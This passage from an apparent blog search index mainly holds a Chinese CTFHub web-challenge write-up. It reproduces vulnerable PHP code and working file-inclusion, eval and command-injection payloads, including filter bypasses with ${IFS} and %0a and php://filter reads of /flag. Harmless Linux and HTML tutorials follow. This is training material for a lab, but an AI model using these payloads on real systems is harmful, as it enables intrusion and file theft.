/flag\");\n//读出flag\n\n![image-20200628182105739](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628182228.png)\n\n![image-20200628182350011](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628182351.png)\n\nctfhub{75677dc8bfc33e2fa49fa77d8e005c7b7032eb2e}\n\n## RCE-远程包含\n\n依旧给我源码\n\n&lt;?php\nerror_reporting(0);\nif (isset($_GET['file'])) &#123;\n    if (!strpos($_GET[\"file\"], \"flag\")) &#123;\n        include $_GET[\"file\"];\n    &#125; else &#123;\n        echo \"Hacker!!!\";\n    &#125;\n&#125; else &#123;\n    highlight_file(__FILE__);\n&#125;\n?>\n&lt;hr>\ni don't have shell, how to get flag?&lt;br>\n&lt;a href=\"phpinfo.php\">phpinfo&lt;/a>\n\n基本一样的源码，访问一下phpinfo.php看看。\n\n![image-20200628182727126](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628182947.png)\n\n可以看到根目录为/var/www/html\n\n使用file参数传入，文件包含，正常显示phpinfo。\n\n![image-20200628183431623](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628184825.png)\n\n所以用`?file=php://input`来构造payload，但是要注意的是GET类型的数据是要过滤的，所以flag有关操作最好用post类型。\n\n//payload\n&lt;?php system(\"ls\");?>\n//没有需要的东西\n&lt;?php system(\"ls /\");?>\n&lt;?php system(\"cat /flag\");?>\n\n不知道为什么我的hackbar的post请求没有用，只能用burp了。\n\n![image-20200628184656573](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628184817.png)\n\n接下来是/目录了\n\n![image-20200628184808751](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628184810.png)\n\n看到了flag\n\n![image-20200628184947633](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628184948.png)\n\nctfhub{7858a5c89ecb8faa952bac39aeaa49c62a6fbf7c}\n\n## RCE-命令注入\n\n给出来源码，审计一下。\n\n&lt;?php\n\n$res &#x3D; FALSE;\n\nif (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;\n    $cmd &#x3D; &quot;ping -c 4 &#123;$_GET[&#39;ip&#39;]&#125;&quot;;\n    exec($cmd, $res);\n&#125;\n\n?&gt;\n\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;CTFHub 命令注入-无过滤&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n\n&lt;h1&gt;CTFHub 命令注入-无过滤&lt;&#x2F;h1&gt;\n\n&lt;form action&#x3D;&quot;#&quot; method&#x3D;&quot;GET&quot;&gt;\n    &lt;label for&#x3D;&quot;ip&quot;&gt;IP : &lt;&#x2F;label&gt;&lt;br&gt;\n    &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;ip&quot; name&#x3D;&quot;ip&quot;&gt;\n    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Ping&quot;&gt;\n&lt;&#x2F;form&gt;\n\n&lt;hr&gt;\n\n&lt;pre&gt;\n&lt;?php\nif ($res) &#123;\n    print_r($res);\n&#125;\n?&gt;\n&lt;&#x2F;pre&gt;\n\n&lt;?php\nshow_source(__FILE__);\n?&gt;\n\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n\n可以执行ping命令查询，可以通过管道符来，执行其他命令。\n\n![image-20200628221522504](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628222756.png)\n\n读一下啊27113349415869.php\n\n![image-20200628221650462](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628222743.png)\n\n没有直接回显内容，查看源代码\n\n![image-20200628221811374](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628222736.png)\n\nctfhub{1286ba20f54e94b4df254c3d31f37da5d4f04b86}\n\n## RCE-过滤cat\n\n过滤了cat命令之后，你还有什么方法能读到 Flag?\n\n&lt;?php\n\n$res &#x3D; FALSE;\n\nif (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;\n    $ip &#x3D; $_GET[&#39;ip&#39;];\n    $m &#x3D; [];\n    if (!preg_match_all(&quot;&#x2F;cat&#x2F;&quot;, $ip, $m)) &#123;\n        $cmd &#x3D; &quot;ping -c 4 &#123;$ip&#125;&quot;;\n        exec($cmd, $res);\n    &#125; else &#123;\n        $res &#x3D; $m;\n    &#125;\n&#125;\n?&gt;\n\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;CTFHub 命令注入-过滤cat&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n\n&lt;h1&gt;CTFHub 命令注入-过滤cat&lt;&#x2F;h1&gt;\n\n&lt;form action&#x3D;&quot;#&quot; method&#x3D;&quot;GET&quot;&gt;\n    &lt;label for&#x3D;&quot;ip&quot;&gt;IP : &lt;&#x2F;label&gt;&lt;br&gt;\n    &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;ip&quot; name&#x3D;&quot;ip&quot;&gt;\n    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Ping&quot;&gt;\n&lt;&#x2F;form&gt;\n\n&lt;hr&gt;\n\n&lt;pre&gt;\n&lt;?php\nif ($res) &#123;\n    print_r($res);\n&#125;\n?&gt;\n&lt;&#x2F;pre&gt;\n\n&lt;?php\nshow_source(__FILE__);\n?&gt;\n\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n和之前一样去查看目录。\n\n![image-20200628222315009](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628222727.png)\n\n使用tac命令来查看，tac为倒序输出内容。\n\n![image-20200628222709026](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628222711.png)\n\nctfhub{d3d712168d7a2272d4f1cd2a4bbaa32e87bdb6b5}\n\n## RCE-过滤空格\n\n过滤了空格试一试用/**/来代替空格。\n\n&lt;?php\n\n$res &#x3D; FALSE;\n\nif (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;\n    $ip &#x3D; $_GET[&#39;ip&#39;];\n    $m &#x3D; [];\n    if (!preg_match_all(&quot;&#x2F; &#x2F;&quot;, $ip, $m)) &#123;\n        $cmd &#x3D; &quot;ping -c 4 &#123;$ip&#125;&quot;;\n        exec($cmd, $res);\n    &#125; else &#123;\n        $res &#x3D; $m;\n    &#125;\n&#125;\n?&gt;\n\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;CTFHub 命令注入-过滤空格&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n\n&lt;h1&gt;CTFHub 命令注入-过滤空格&lt;&#x2F;h1&gt;\n\n&lt;form action&#x3D;&quot;#&quot; method&#x3D;&quot;GET&quot;&gt;\n    &lt;label for&#x3D;&quot;ip&quot;&gt;IP : &lt;&#x2F;label&gt;&lt;br&gt;\n    &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;ip&quot; name&#x3D;&quot;ip&quot;&gt;\n    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Ping&quot;&gt;\n&lt;&#x2F;form&gt;\n\n&lt;hr&gt;\n\n&lt;pre&gt;\n&lt;?php\nif ($res) &#123;\n    print_r($res);\n&#125;\n?&gt;\n&lt;&#x2F;pre&gt;\n\n&lt;?php\nshow_source(__FILE__);\n?&gt;\n\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n![image-20200628223002682](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628223003.png)\n\n/**/没有用，%20也不行，后来也是边查边试，%09、、<>、{,}都不好使，${IFS}可以用。\n\n![image-20200628223317074](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628223319.png)\n\nctfhub{a353a9c308a2887a369a60259d3ac8750cf987a5}\n\n## RCE-过滤目录分割符\n\n&lt;?php\n\n$res &#x3D; FALSE;\n\nif (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;\n    $ip &#x3D; $_GET[&#39;ip&#39;];\n    $m &#x3D; [];\n    if (!preg_match_all(&quot;&#x2F;\\&#x2F;&#x2F;&quot;, $ip, $m)) &#123;\n        $cmd &#x3D; &quot;ping -c 4 &#123;$ip&#125;&quot;;\n        exec($cmd, $res);\n    &#125; else &#123;\n        $res &#x3D; $m;\n    &#125;\n&#125;\n?&gt;\n\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;CTFHub 命令注入-过滤目录分隔符&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n\n&lt;h1&gt;CTFHub 命令注入-过滤目录分隔符&lt;&#x2F;h1&gt;\n\n&lt;form action&#x3D;&quot;#&quot; method&#x3D;&quot;GET&quot;&gt;\n    &lt;label for&#x3D;&quot;ip&quot;&gt;IP : &lt;&#x2F;label&gt;&lt;br&gt;\n    &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;ip&quot; name&#x3D;&quot;ip&quot;&gt;\n    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Ping&quot;&gt;\n&lt;&#x2F;form&gt;\n\n&lt;hr&gt;\n\n&lt;pre&gt;\n&lt;?php\nif ($res) &#123;\n    print_r($res);\n&#125;\n?&gt;\n&lt;&#x2F;pre&gt;\n\n&lt;?php\nshow_source(__FILE__);\n?&gt;\n\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n`127.0.0.1;ls`\n\n![image-20200628223550561](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628224218.png)\n\n`127.0.0.1;ls flag_is_here`\n\n![image-20200628223917466](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628224214.png)\n\n发现有一个目录是flag_is_here，那么就会用到/，但是/已经被过滤了，看一下多重查询吧。\n\n`127.0.0.1;cd flag_is_here;cat flag_10742619119266 `\n\n![image-20200628224040828](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628224207.png)\n\nctfhub{42c0df575f8ef8f2d2c514451e8e38e56af91807}\n\n## RCE-过滤运算符\n\n&lt;?php\n\n$res &#x3D; FALSE;\n\nif (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;\n    $ip &#x3D; $_GET[&#39;ip&#39;];\n    $m &#x3D; [];\n    if (!preg_match_all(&quot;&#x2F;(\\||\\&amp;)&#x2F;&quot;, $ip, $m)) &#123;\n        $cmd &#x3D; &quot;ping -c 4 &#123;$ip&#125;&quot;;\n        exec($cmd, $res);\n    &#125; else &#123;\n        $res &#x3D; $m;\n    &#125;\n&#125;\n?&gt;\n\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;CTFHub 命令注入-过滤运算符&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n\n&lt;h1&gt;CTFHub 命令注入-过滤运算符&lt;&#x2F;h1&gt;\n\n&lt;form action&#x3D;&quot;#&quot; method&#x3D;&quot;GET&quot;&gt;\n    &lt;label for&#x3D;&quot;ip&quot;&gt;IP : &lt;&#x2F;label&gt;&lt;br&gt;\n    &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;ip&quot; name&#x3D;&quot;ip&quot;&gt;\n    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Ping&quot;&gt;\n&lt;&#x2F;form&gt;\n\n&lt;hr&gt;\n\n&lt;pre&gt;\n&lt;?php\nif ($res) &#123;\n    print_r($res);\n&#125;\n?&gt;\n&lt;&#x2F;pre&gt;\n\n&lt;?php\nshow_source(__FILE__);\n?&gt;\n\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n|、&都被过滤了，但是可以用；啊，所以问题不大。\n\n`127.0.0.1;ls`\n\n![image-20200628224623944](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628224948.png)\n\n`127.0.0.1;cat flag_13781671312162.php`\n\n![image-20200628224735719](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628224736.png)\n\nctfhub{936a9fdae7b6722a79a1d6bec50caefbe8701150}\n\n## 综合过滤练习\n\n&lt;?php\n\n$res &#x3D; FALSE;\n\nif (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;\n    $ip &#x3D; $_GET[&#39;ip&#39;];\n    $m &#x3D; [];\n    if (!preg_match_all(&quot;&#x2F;(\\||&amp;|;| |\\&#x2F;|cat|flag|ctfhub)&#x2F;&quot;, $ip, $m)) &#123;\n        $cmd &#x3D; &quot;ping -c 4 &#123;$ip&#125;&quot;;\n        exec($cmd, $res);\n    &#125; else &#123;\n        $res &#x3D; $m;\n    &#125;\n&#125;\n?&gt;\n\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;CTFHub 命令注入-综合练习&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n\n&lt;h1&gt;CTFHub 命令注入-综合练习&lt;&#x2F;h1&gt;\n\n&lt;form action&#x3D;&quot;#&quot; method&#x3D;&quot;GET&quot;&gt;\n    &lt;label for&#x3D;&quot;ip&quot;&gt;IP : &lt;&#x2F;label&gt;&lt;br&gt;\n    &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;ip&quot; name&#x3D;&quot;ip&quot;&gt;\n    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Ping&quot;&gt;\n&lt;&#x2F;form&gt;\n\n&lt;hr&gt;\n\n&lt;pre&gt;\n&lt;?php\nif ($res) &#123;\n    print_r($res);\n&#125;\n?&gt;\n&lt;&#x2F;pre&gt;\n\n&lt;?php\nshow_source(__FILE__);\n?&gt;\n\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n过滤了|、&、；、 、/、cat、flag、ctfhub\n\n`127.0.0.1%0als`\n\n![image-20200628230357331](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628230358.png)\n\n`127.0.0.1%0acd${IFS}f***_is_here%0als`\n\n![image-20200628230608227](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628230609.png)\n\n`127.0.0.1%0acd${IFS}f***_is_here%0atac${IFS}f***_1604066874064.php`\n\n![NR5E8I.png](https://s1.ax1x.com/2020/06/28/NR5E8I.png)\n\nctfhub{2ec92a03ba9f32415c90ec0f1774256c45363ffb}\n\n## RCE-eval\n\n&lt;?php\nif (isset($_REQUEST['cmd'])) &#123;\n    eval($_REQUEST[\"cmd\"]);\n&#125; else &#123;\n    highlight_file(__FILE__);\n&#125;\n?>\n\n源码在此eval函数直接执行了传入的cmd参数，这是一个很严重的错误。之前学Python的时候就写过一个关于eval函数执行命令的blog，eval也是在代码审计过程中重点关注的对象。\n\nhttp://challenge-a70680c9bd2e7657.sandbox.ctfhub.com:10080/?cmd=system(\"ls ../../../\");\n\n发现在了flag文件，直接读flag\n\n![w44AdH.png](https://s1.ax1x.com/2020/09/18/w44AdH.png)\n\n## RCE-php://input\n\n&lt;?php\nif (isset($_GET['file'])) &#123;\n    if ( substr($_GET[\"file\"], 0, 6) === \"php://\" ) &#123;\n        include($_GET[\"file\"]);\n    &#125; else &#123;\n        echo \"Hacker!!!\";\n    &#125;\n&#125; else &#123;\n    highlight_file(__FILE__);\n&#125;\n?>\n\n还给了一句i don't have shell, how to get flag?\n\n查看phpinfo文件可以看到根目录为/var/www/html\n\n![wI1w6S.png](https://s1.ax1x.com/2020/09/19/wI1w6S.png)\n\n然后就执行命令寻找flag\n\n![wI1rwj.png](https://s1.ax1x.com/2020/09/19/wI1rwj.png)\n\n得到flag。\n\n## 读取源代码\n\n&lt;?php\nerror_reporting(E_ALL);\nif (isset($_GET['file'])) &#123;\n    if ( substr($_GET[\"file\"], 0, 6) === \"php://\" ) &#123;\n        include($_GET[\"file\"]);\n    &#125; else &#123;\n        echo \"Hacker!!!\";\n    &#125;\n&#125; else &#123;\n    highlight_file(__FILE__);\n&#125;\n?>\n&lt;hr>\ni don't have shell, how to get flag? &lt;br>\nflag in &lt;code>/flag&lt;/code>\ni don't have shell, how to get flag?\nflag in /flag\n\nphp伪协议读内容：\n\n?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;&#x2F;flag\n\n![wI6hjg.png](https://s1.ax1x.com/2020/09/19/wI6hjg.png)\n\n得到flag，很多时候还要用\n\n?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag\n\n\n\n","slug":"CTFHub技能树web完结","date":"2020-06-27T08:03:19.000Z","categories_index":"CTF","tags_index":"CTF,WEB","author_index":"A1andNS"},{"id":"792f8acb0007434600568d85ccdd061c","title":"Linux学习(一）","content":"Linux常识Linux 内核最初只是由芬兰人林纳斯·托瓦兹（Linus Torvalds）在赫尔辛基大学上学时出于个人爱好而编写的。Linux 是一套免费使用和自由传播的类 Unix 操作系统，是一个基于 POSIX 和 UNIX 的多用户、多任务、支持多线程和多 CPU 的操作系统。Linux 能运行主要的 UNIX 工具软件、应用程序和网络协议。它支持 32 位和 64 位硬件。Linux 继承了 Unix 以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。\n我之前也接触过Linux，像deepin、kali Linux等等。\nLinux发行版Linux的发行版可以说是把Linux内核和软件做打包。\n如下图，发行家族中常见的就是Debian、Fedora、SUSE，当然还有其他的一些。\n\nLinux应用Linux发行版现在已经大量应用于各个方面，从嵌入式到超算都有Linux的身影。特别是在服务器上都快一统江湖了，大多数服务器运行Linux系统，使用LAMP或LNMP。A是apache，N是Nginx。\n除了服务器，Linux还是国防、政府的选择项。\nLinux系统启动过程Linux启动时会在屏幕上回显很多信息。这个启动过程分为5个阶段。\n\n内核引导\n运行init\n系统初始化\n建立终端\n用户登录系统\n\n\n内核引导当计算机打开电源，就会做BIOS开机自检，按照BIOS的启动优先级来启动，一般都是硬盘启动，然后操作系统接管硬件，先读入/boot目录下的内核文件。\n运行initinit 进程是系统所有进程的起点，没有这个进程，系统中任何进程都不会启动。init 程序首先是需要读取配置文件 /etc/inittab。\n运行级别许多程序需要开机启动。它们在Windows叫做”服务”（service），在Linux就叫做”守护进程”（daemon）。init进程的一大任务，就是去运行这些开机启动的程序。\n不同的场合需要启动不同的程序，比如用作服务器时，需要启动Apache，用作桌面就不需要。Linux允许为不同的场合，分配不同的开机启动程序，这就叫做”运行级别”（runlevel）。运行级别就相当于时设置了场景，根据场景（运行级别）就可以启动相对应的所需程序。\nLinux的7运行级别\n\n运行级别0：系统停机状态，系统默认运行级别不能设为0，否则不能正常启动\n运行级别1：单用户工作状态，root权限，用于系统维护，禁止远程登陆\n运行级别2：多用户状态(没有NFS)\n运行级别3：完全的多用户状态(有NFS)，登陆后进入控制台命令行模式\n运行级别4：系统未使用，保留\n运行级别5：X11控制台，登陆后进入图形GUI模式\n运行级别6：系统正常关闭并重启，默认运行级别不能设为6，否则不能正常启动\n\n系统初始化在init的配置文件中有这么一行： si::sysinit:/etc/rc.d/rc.sysinit　它调用执行了/etc/rc.d/rc.sysinit，而rc.sysinit是一个bash shell的脚本，它主要是完成一些系统初始化的工作，rc.sysinit是每一个运行级别都要首先运行的重要脚本。这是初始化必备脚本。它要激活交换分区，检查磁盘，加载硬件模块以及其他一些需要的优先执行任务。\n15:5:wait:/etc/rc.d/ec 5\n\n这一行表示以5为参数运行/etc/rc.d/rc，/etc/rc.d/rc是一个Shell脚本，它接受5作为参数，去执行/etc/rc.d/rc5.d/目录下的所有的rc启动脚本，/etc/rc.d/rc5.d/目录中的这些启动脚本实际上都是一些连接文件，而不是真正的rc启动脚本，真正的rc启动脚本实际上都是放在/etc/rc.d/init.d/目录下。\n建立终端rc执行完毕后，返回init。这时基本系统环境已经设置好了，各种守护进程也已经启动了。init接下来会打开6个终端，以便用户登录系统。这6个终端在inittab里被定义。\n通过运行特定程序，就可以在屏幕上显示一个文本登录界面就是我们常见的用户登录界面了。\n用户登录系统用户的登录方式有三种：\n\n命令行登录\nssh登录\n图形界面登录\n\n通过GUI登录界面登录成功后可以直接进入KDE、Gnome等窗口管理器。\n命令行登录就是命令行的形式，输入用户密码等进行登录，注意一点一般密码处是没有回显的。\nLinux关机服务器正确的关机流程为：sync &gt; shutdown &gt; reboot &gt; halt\n关机使用指令：shutdown\nsync 将数据由内存同步到硬盘中。\n\nshutdown 关机指令\n\n关机\nshutdown –h 10 ‘This server will shutdown after 10 mins’ 这个命令告诉大家，计算机将在10分钟后关机，并且会显示在登陆用户的当前屏幕中。\n\nshutdown –h now 立马关机\n\nshutdown –h 20:25 系统会在今天20:25关机\n\nshutdown –h +10 十分钟后关机\n\n重启\nshutdown –r now 系统立马重启\n\nshutdown –r +10 系统十分钟后重启\n\n其他写法\nreboot 就是重启，等同于 shutdown –r now\n\nhalt 关闭系统，等同于shutdown –h now 和 poweroff\n\nLinux 系统目录结构树状结构图：\n\n目录解释和用处\n/bin：bin是Birnary的缩写, 这个目录存放着最经常使用的命令。\n\n/boot：这里存放的是启动Linux时使用的一些核心文件，包括一些连接文件以及镜像文件。这是个很重要的地方，随便乱搞就会启动不了。\n\n/dev ：dev是Device(设备)的缩写, 该目录下存放的是Linux的外部设备，在Linux中访问设备的方式和访问文件的方式是相同的。像我之前插入了一个U盘，/dev/sda就表示了U盘的整个磁盘。\n\n/etc：这个目录用来存放所有的系统管理所需要的配置文件和子目录。\n\n/home：用户的主目录，在Linux中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的。\n\n/lib：这个目录里存放着系统最基本的动态连接共享库，其作用类似于Windows里的DLL文件。几乎所有的应用程序都需要用到这些共享库。\n\n/lost+found：这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。\n\n/media：linux 系统会自动识别一些设备，例如U盘、光驱等等，当识别后，linux会把识别的设备挂载到这个目录下。\n\n/mnt：系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在/mnt/上，然后进入该目录就可以查看光驱里的内容了。\n\n/opt： 这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库则就可以放到这个目录下。默认是空的。\n\n/proc：这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件，比如可以通过下面的命令来屏蔽主机的ping命令，使别人无法ping你的机器：\necho 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;icmp_echo_ignore_all\n/root：该目录为系统管理员，也称作超级权限者的用户主目录。\n\n/sbin：s就是Super User的意思，这里存放的是系统管理员使用的系统管理程序。\n\n/selinux： 这个目录是Redhat/CentOS所特有的目录，Selinux是一个安全机制，类似于windows的防火墙，但是这套机制比较复杂，这个目录就是存放selinux相关的文件的。\n\n/srv： 该目录存放一些服务启动之后需要提取的数据。\n\n/sys：\n 这是linux2.6内核的一个很大的变化。该目录下安装了2.6内核中新出现的一个文件系统 sysfs 。\nsysfs文件系统集成了下面3种文件系统的信息：针对进程信息的proc文件系统、针对设备的devfs文件系统以及针对伪终端的devpts文件系统。\n该文件系统是内核设备树的一个直观反映。\n当一个内核对象被创建的时候，对应的文件和目录也在内核对象子系统中被创建。\n\n/tmp：这个目录是用来存放一些临时文件的。\n\n/usr： 这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于windows下的program files目录。\n\n/usr/bin：系统用户使用的应用程序。\n\n/usr/sbin：超级用户使用的比较高级的管理程序和系统守护程序。\n\n/usr/src：内核源代码默认的放置目录。\n\n/var：这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件。\n\n/run：是一个临时文件系统，存储系统启动以来的信息。当系统重启时，这个目录下的文件应该被删掉或清除。如果你的系统上有 /var/run 目录，应该让它指向 run。\n\n\n/bin和/usr/bin是给系统用户使用的命令，而sbin和/usr/sbin是给root用户使用的命令，用的时候要用到sudo来提供root权限。\ndeepin-wine使用小技巧修改dpi方法一：这几天在用Ubuntu20.04，装了一个deepin-wine和wine应用让dpi给搞糊涂了，刚刚发现在/opt/deepinwine/中有一个Setdpi.sh的脚本可以设置应用dpi，只要选好dpi用起来舒服啊，我是设置120,我是1080P屏。但是这样只能用一次，每次启动都要这样才行。\n方法二：使用命令打开相应应用的wine配置，修改dpi到适合的值就可以了，而且一次修改永久有效。\nenv WINEPREFIX=\"/home/a1andns/.deepinwine/Deepin-QQ\" /usr/bin/deepin-wine winecfg\n\n微信啊什么的也都可以改一下了，没有合适的dpi真的搞瞎了眼。\n记录一下，以备以后查用。\n参考资料【1】菜鸟教程\n","slug":"Linux学习-一）","date":"2020-06-01T13:10:48.000Z","categories_index":"Linux学习","tags_index":"Linux","author_index":"A1andNS"},{"id":"a285b323cdcf629d2df823fa07ff6e28","title":"HTML基础学习(五)","content":"HTML框架想要再同一个浏览器窗口中显示不止一个页面，就要用框架。\n框架也就是iframe，它的语法\n&lt;iframe src=\"URL\">&lt;/iframe>\n\n这里的URL为想要显示的其他网页的URL。\n高度和宽度height和width属性用来定义iframe标签的高度和宽度，默认的单位都是像素，也可以使用比例的方式来显示（xx%）\n&lt;iframe src=\"https://a1andns.github.io/\" width=\"200\" height=\"200\">\n&lt;/iframe>\n\n边框frameborder属性定义了iframe是否显示边框。设置属性为”0”表示没有边框，反之”1”表示由边框。\n&lt;iframe src=\"https://a1andns.github.io/\" frameborder=\"0\">&lt;/iframe>\n\n自己写了下看看效果，还可以啊。\n\niframe显示目标链接网页感觉像预览，但是它不会跳出网页，不会覆盖网页。而是使用了iframe进行访问。看下面就行了。\n A1andNS\n\nHTML颜色HTML颜色是由红绿蓝三基色混合而成。\n颜色值HTML 颜色由一个十六进制符号来定义，这个符号由红色、绿色和蓝色的值组成（RGB）。每种颜色的最小值是0（十六进制：#00）。最大值是255（十六进制：#FF）。\n这样就是像6位16进制数来表示颜色值，对应rbg(x1,x2,x3)\n这个表格给出了由三种颜色混合而成的具体效果(菜鸟教程的)：\n\n颜色值\n\n  \n    颜色(Color)\n    颜色十六进制(Color HEX)\n    颜色RGB(Color RGB)\n  \n  \n    \n    #000000\n    rgb(0,0,0)\n  \n  \n    \n    #FF0000\n    rgb(255,0,0)\n  \n  \n    \n    #00FF00\n    rgb(0,255,0)\n  \n  \n    \n    #0000FF\n    rgb(0,0,255)\n  \n  \n    \n    #FFFF00\n    rgb(255,255,0)\n  \n  \n    \n    #00FFFF\n    rgb(0,255,255)\n  \n  \n    \n    #FF00FF\n    rgb(255,0,255)\n  \n  \n    \n    #C0C0C0\n    rgb(192,192,192)\n  \n  \n    \n    #FFFFFF\n    rgb(255,255,255)\n  \n\n\n\n1600万色三种红绿蓝组合的记过就是，256^3种颜色。\n颜色值红色渐变图：\n\n\nRed Light\nColor HEX\nColor RGB\n\n\n\n#000000\nrgb(0,0,0)\n\n\n\n\n#080000\nrgb(8,0,0)\n\n\n\n\n#100000\nrgb(16,0,0)\n\n\n\n\n#180000\nrgb(24,0,0)\n\n\n\n\n#200000\nrgb(32,0,0)\n\n\n\n\n#280000\nrgb(40,0,0)\n\n\n\n\n#300000\nrgb(48,0,0)\n\n\n\n\n#380000\nrgb(56,0,0)\n\n\n\n\n#400000\nrgb(64,0,0)\n\n\n\n\n#480000\nrgb(72,0,0)\n\n\n\n\n#500000\nrgb(80,0,0)\n\n\n\n\n#580000\nrgb(88,0,0)\n\n\n\n\n#600000\nrgb(96,0,0)\n\n\n\n\n#680000\nrgb(104,0,0)\n\n\n\n\n#700000\nrgb(112,0,0)\n\n\n\n\n#780000\nrgb(120,0,0)\n\n\n\n\n#800000\nrgb(128,0,0)\n\n\n\n\n#880000\nrgb(136,0,0)\n\n\n\n\n#900000\nrgb(144,0,0)\n\n\n\n\n#980000\nrgb(152,0,0)\n\n\n\n\n#A00000\nrgb(160,0,0)\n\n\n\n\n#A80000\nrgb(168,0,0)\n\n\n\n\n#B00000\nrgb(176,0,0)\n\n\n\n\n#B80000\nrgb(184,0,0)\n\n\n\n\n#C00000\nrgb(192,0,0)\n\n\n\n\n#C80000\nrgb(200,0,0)\n\n\n\n\n#D00000\nrgb(208,0,0)\n\n\n\n\n#D80000\nrgb(216,0,0)\n\n\n\n\n#E00000\nrgb(224,0,0)\n\n\n\n\n#E80000rgb(232,0,0)\n\n\n\n\n#F00000\nrgb(240,0,0)\n\n\n\n\n#F80000\nrgb(248,0,0)\n\n\n\n\n#FF0000\nrgb(255,0,0)\n\n\n\n\n  灰色渐变图：\n\n\nGray Shades\nColor HEX\nColor 